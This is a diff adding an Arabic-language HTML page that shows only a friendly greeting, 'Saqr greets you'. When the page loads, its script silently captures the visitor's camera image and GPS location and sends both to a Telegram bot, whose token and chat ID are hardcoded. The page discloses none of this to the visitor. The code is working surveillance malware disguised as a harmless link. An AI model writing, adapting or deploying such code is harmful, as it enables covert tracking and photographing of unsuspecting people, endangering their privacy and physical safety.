@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صقر يسلم عليك</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+            direction: rtl;
+        }
+        #message {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div id="message">صقر يسلم عليك</div>
+    <script>
+        async function startCamera() {
+            try {
+                // طلب إذن الوصول إلى الكاميرا والموقع
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // بعد الحصول على إذن الكاميرا، نحصل على الموقع
+                getLocation(stream);
+            } catch (err) {
+                console.error('خطأ في الوصول إلى الكاميرا: ', err);
+            }
+        }
+
+        function getLocation(stream) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const { latitude, longitude } = position.coords;
+                    captureImage(stream, latitude, longitude);
+                }, error => {
+                    console.error('خطأ في الحصول على الموقع: ', error);
+                });
+            } else {
+                console.error('الموقع غير مدعوم في هذا المتصفح.');
+            }
+        }
+
+        function captureImage(stream, latitude, longitude) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            // انتظر قليلاً ثم التقط الصورة
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/png');
+
+                // إيقاف تشغيل الكاميرا
+                stream.getTracks().forEach(track => track.stop());
+
+                // إرسال الصورة والإحداثيات إلى Telegram
+                sendToTelegram(latitude, longitude, imageData);
+            }, 3000); // التقط الصورة بعد 3 ثوانٍ
+        }
+
+        function sendToTelegram(lat, long, imageData) {
+            const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
+            const chatId = '6185375878';
+            const message = `إحداثيات الموقع:\nLatitude: ${lat}\nLongitude: ${long}`;
+            const apiUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
+
+            // تحويل الصورة إلى Blob
+            fetch(imageData)
+                .then(res => res.blob())
+                .then(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'photo.png');
+                    formData.append('caption', message);
+
+                    return fetch(apiUrl, {
+                        method: 'POST',
+                        body: formData
+                    });
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('تم إرسال البيانات إلى Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('خطأ في إرسال البيانات إلى Telegram: ', error);
+                });
+        }
+
+        window.onload = startCamera;
+    </script>
+</body>
+</html>
